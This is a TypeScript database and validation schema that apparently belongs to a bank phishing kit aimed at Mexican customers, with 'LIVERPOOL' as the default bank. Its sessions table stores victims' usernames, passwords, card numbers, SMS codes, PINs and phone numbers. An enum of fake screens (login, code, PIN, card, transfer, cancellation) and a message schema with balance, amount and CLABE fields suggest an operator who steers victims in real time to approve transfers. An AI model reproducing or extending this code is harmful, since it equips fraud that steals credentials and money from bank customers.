import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Session represents a client connection
export const sessions = pgTable("sessions", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  folio: text("folio"),
  username: text("username"),
  password: text("password"),
  banco: text("banco").default("LIVERPOOL"),
  tarjeta: text("tarjeta"),
  sms: text("sms"),
  nip: text("nip"),
  smsCompra: text("sms_compra"),
  celular: text("celular"),
  pasoActual: text("paso_actual").default("folio"),
  createdAt: timestamp("created_at").defaultNow(),
  active: boolean("active").default(true),
});

export const insertSessionSchema = createInsertSchema(sessions).pick({
  sessionId: true,
  folio: true,
  username: true,
  password: true,
  banco: true,
});

export type InsertSession = z.infer<typeof insertSessionSchema>;
export type Session = typeof sessions.$inferSelect;

// Define screen types for type safety
export enum ScreenType {
  FOLIO = "folio",
  LOGIN = "login",
  CODIGO = "codigo",
  NIP = "nip",
  PROTEGER = "protege",
  TARJETA = "tarjeta",
  TRANSFERIR = "transferir",
  CANCELACION = "cancelacion",
  MENSAJE = "mensaje",
  VALIDANDO = "validando",
}

// Schema for screen change messages
export const screenChangeSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  terminacion: z.string().optional(),
  saldo: z.string().optional(),
  monto: z.string().optional(),
  clabe: z.string().optional(),
  titular: z.string().optional(),
  comercio: z.string().optional(),
  mensaje: z.string().optional(),
});

export type ScreenChangeData = z.infer<typeof screenChangeSchema>;

// Schema for client data input
export const clientInputSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  data: z.record(z.any()),
});

export type ClientInputData = z.infer<typeof clientInputSchema>;
